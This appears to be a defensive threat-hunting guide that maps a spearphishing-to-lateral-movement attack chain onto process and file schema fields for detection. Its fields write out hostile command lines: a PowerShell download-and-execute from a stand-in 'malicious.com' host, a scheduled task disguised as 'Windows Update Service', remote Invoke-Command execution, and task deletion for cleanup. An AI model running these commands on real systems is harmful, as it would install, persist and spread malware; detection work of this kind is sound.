1. **Identify Initial Access via Spearphishing Email**  
   - Monitor for the creation of processes related to Outlook that involve email interactions. Specifically, look for emails with attachments named "invoice.docx".  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" (or similar path for Outlook)  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "invoice.docx"  

2. **Identify Execution of Malicious Payload**  
   - Monitor for PowerShell execution that includes suspicious command-line arguments, particularly those involving `Invoke-WebRequest` or `IEX`.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `srcNode.Cmdline`: `-ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/malware.exe' -OutFile 'C:\\Users\\Public\\malware.exe'; Start-Process 'C:\\Users\\Public\\malware.exe'"`  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "malware.exe"  

3. **Identify Establishing Persistence via Scheduled Task**  
   - Monitor for the creation of scheduled tasks using `schtasks.exe` with parameters that create tasks mimicking legitimate system tasks.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\schtasks.exe"  
     - `srcNode.Cmdline`: `/create /tn "Windows Update Service" /tr "C:\\Users\\Public\\malware.exe" /sc ONLOGON /ru "SYSTEM"`  
     - `dstNode.Type`: null (as it is a task creation event)  

4. **Identify Lateral Movement and Further Exploitation**  
   - Monitor for unusual RDP connections initiated by the SYSTEM account and the creation of additional scheduled tasks on other machines.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `srcNode.Cmdline`: `Invoke-Command -ComputerName "RemotePC" -ScriptBlock { Start-Process "C:\\Users\\Public\\malware.exe" }`  
     - `dstNode.Type`: "Process"  
     - `dstNode.Image`: "C:\\Users\\Public\\malware.exe"  

5. **Identify Cleanup and Evasion Techniques**  
   - Monitor for modifications or deletions of scheduled tasks using `schtasks.exe` that may indicate attempts to hide malicious activity.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\schtasks.exe"  
     - `srcNode.Cmdline`: `/delete /tn "Windows Update Service" /f`  
     - `dstNode.Type`: null (as it is a task deletion event)  